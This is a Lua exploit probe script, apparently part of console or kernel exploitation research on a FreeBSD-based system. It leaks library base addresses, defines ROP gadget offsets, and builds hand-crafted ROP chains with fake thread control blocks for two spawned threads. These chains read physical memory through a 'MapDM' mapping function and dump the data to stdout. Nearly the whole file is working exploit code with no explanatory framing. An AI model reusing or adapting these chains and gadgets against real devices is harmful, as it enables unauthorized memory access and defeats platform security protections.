-- CRASH_CLASS: MODERATE
-- PROBE 562n: Dual-child physical memory read
--
-- 562m: write(1) from traced child produces ZERO bytes.
-- fn_addr syscalls are suppressed for MapDM-tainted child threads.
--
-- STRATEGY: Two child threads.
-- Child A (clean): nanosleep(50ms), then write(1, shared, 64), thr_exit
-- Child B (tainted): sysarch, read 4 qwords from MapDM → shared, thr_exit
--
-- Child A never touches MapDM → fn_addr should work for it.
-- Child B reads physical memory → shared buffer (writes work in userland).
-- Child A wakes after 50ms and writes the shared buffer to stdout.
--
-- If process dies when child B completes (~1ms), child A never wakes.
-- If process survives, child A sends data.
--
-- ALSO: test fn_addr from clean child during trace (calibration).
-- Child A writes KNOWN data first (before MapDM reads complete),
-- then sleeps, then writes shared buffer with actual phys data.

print("=== PROBE 562n: DUAL-CHILD PHYS READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
local g_mov_rax_m = eb + 0x1A5CC4

io.flush()

-- ============================================================
-- [A] MapDM phys 0x100000000
-- ============================================================
print("[A] MapDM")
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [B] Shared buffer (64 bytes)
-- ============================================================
local shared = memory.alloc(0x80)
for i = 0, 0x7C, 4 do wd(N(shared) + i, 0) end
local sh = N(shared)

-- Pre-fill markers
wq(sh + 0x00, uint64("0xAABBCCDD11223344"))
wq(sh + 0x08, uint64("0x55667788AABBCCDD"))
-- +0x10..+0x28: child B writes phys data here
wq(sh + 0x30, uint64("0xDEADFACE00C0FFEE"))  -- pre-fill (child B overwrites with CAFEBABE)
wq(sh + 0x38, uint64("0xFEEDBABE12345678"))  -- end marker

-- Calibration buffer (16 bytes with known pattern — child A writes this first)
local cal = memory.alloc(0x20)
local ca = N(cal)
wq(ca + 0x00, uint64("0xCAFECAFE11111111"))
wq(ca + 0x08, uint64("0xBEEFBEEF22222222"))

-- ============================================================
-- [C] Build CHILD A chain (clean — write calibration + sleep + write shared)
-- ============================================================
print("[C] building child A (writer)")
local ss_a = 0x8000
local ok_sa, sb_a_raw = pcall(function()
    return sc477(Z, uint64(ss_a), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sb_a = N(sb_a_raw)
local rsp_a = sb_a + ss_a - ((sb_a + ss_a) % 16) - 8

-- Fake TCB for child A
local tcb_a = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_a) + i, 0) end
wq(N(tcb_a), uint64(N(tcb_a)))
local fsb_a = memory.alloc(8)
wq(N(fsb_a), uint64(N(tcb_a)))

local off_a = 0
local function ea(v) wq(rsp_a + off_a, v); off_a = off_a + 8 end

-- 1. sysarch(SET_FSBASE=129, &fake_tcb)
ea(g_pop_rdi); ea(uint64(129))
ea(g_pop_rsi); ea(uint64(N(fsb_a)))
ea(g_pop_rax); ea(uint64(165))
ea(stub)

-- 2. CALIBRATION: write(1, cal, 16) — proves fn_addr works from clean child
ea(g_pop_rdi); ea(uint64(1))
ea(g_pop_rsi); ea(uint64(ca))
ea(g_pop_rdx); ea(uint64(16))
ea(g_pop_rax); ea(uint64(4))
ea(stub)

-- 3. nanosleep({0, 50000000}, NULL) — 50ms
local ts = memory.alloc(16)
wq(N(ts), Z)                           -- tv_sec = 0
wq(N(ts) + 8, uint64(50000000))        -- tv_nsec = 50ms
ea(g_pop_rdi); ea(uint64(N(ts)))
ea(g_pop_rsi); ea(Z)
ea(g_pop_rax); ea(uint64(240))         -- SYS_nanosleep
ea(stub)

-- 4. write(1, shared, 64) — the actual phys memory data
ea(g_pop_rdi); ea(uint64(1))
ea(g_pop_rsi); ea(uint64(sh))
ea(g_pop_rdx); ea(uint64(64))
ea(g_pop_rax); ea(uint64(4))
ea(stub)

-- 5. thr_exit(0)
ea(g_pop_rdi); ea(Z)
ea(g_pop_rax); ea(uint64(431))
ea(stub)

print(string.format("  chain A: %d entries", off_a/8))

-- thr_param A
local pa_a = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa_a) + i, 0) end
wq(N(pa_a), g_bare_ret)
wq(N(pa_a) + 0x10, uint64(sb_a))
wq(N(pa_a) + 0x18, uint64(ss_a))
local tid_a = memory.alloc(8); wq(N(tid_a), Z)
wq(N(pa_a) + 0x30, tid_a)

-- ============================================================
-- [D] Build CHILD B chain (tainted — reads MapDM physical memory)
-- ============================================================
print("[D] building child B (reader)")
local ss_b = 0x4000
local ok_sb, sb_b_raw = pcall(function()
    return sc477(Z, uint64(ss_b), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sb_b = N(sb_b_raw)
local rsp_b = sb_b + ss_b - ((sb_b + ss_b) % 16) - 8

-- Fake TCB for child B
local tcb_b = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_b) + i, 0) end
wq(N(tcb_b), uint64(N(tcb_b)))
local fsb_b = memory.alloc(8)
wq(N(fsb_b), uint64(N(tcb_b)))

local off_b = 0
local function eb(v) wq(rsp_b + off_b, v); off_b = off_b + 8 end

-- 1. sysarch(SET_FSBASE=129, &fake_tcb)
eb(g_pop_rdi); eb(uint64(129))
eb(g_pop_rsi); eb(uint64(N(fsb_b)))
eb(g_pop_rax); eb(uint64(165))
eb(stub)

-- 2. Read 4 qwords from mapped_va → shared+0x10..+0x28
for qi = 0, 3 do
    eb(g_pop_rsi); eb(mapped_va + uint64(qi * 8))
    eb(g_mov_rax_m)
    eb(g_pop_rdi); eb(uint64(sh + 0x10 + qi * 8))
    eb(g_mov_m_rax)
end

-- 3. Write completion marker
eb(g_pop_rax); eb(uint64("0xDEADFACECAFEBABE"))
eb(g_pop_rdi); eb(uint64(sh + 0x30))
eb(g_mov_m_rax)

-- 4. thr_exit(0)
eb(g_pop_rdi); eb(Z)
eb(g_pop_rax); eb(uint64(431))
eb(stub)

print(string.format("  chain B: %d entries", off_b/8))

-- thr_param B
local pa_b = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa_b) + i, 0) end
wq(N(pa_b), g_bare_ret)
wq(N(pa_b) + 0x10, uint64(sb_b))
wq(N(pa_b) + 0x18, uint64(ss_b))
local tid_b = memory.alloc(8); wq(N(tid_b), Z)
wq(N(pa_b) + 0x30, tid_b)

io.flush()

-- ============================================================
-- [E] Spawn child A FIRST (clean writer), then child B (tainted reader)
-- ============================================================
print("[E] spawning child A (clean writer)...")
io.flush()
local ok_ta, rv_ta = pcall(function() return mk(455)(pa_a, uint64(0x38)) end)
print("child_A ret=" .. (ok_ta and N(rv_ta) or -999))
io.flush()

-- Small delay to let child A start and write calibration data
for w = 1, 5000 do local _ = rd(sb_a) end

print("[F] spawning child B (MapDM reader)...")
print("MARKERS: cal=CAFECAFE11111111 start=AABBCCDD11223344 end=DEADFACECAFEBABE")
io.flush()

local ok_tb, rv_tb = pcall(function() return mk(455)(pa_b, uint64(0x38)) end)
print("child_B ret=" .. (ok_tb and N(rv_tb) or -999))
io.flush()

-- Wait
for w = 1, 100000 do
    for j = 1, 5 do local x = j * j end
end

-- If main thread survived
io.flush()
print("")
local sv = rb(sh + 0x30) or 0
print(string.format("sentinel=0x%X", sv))
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562n DONE ===")
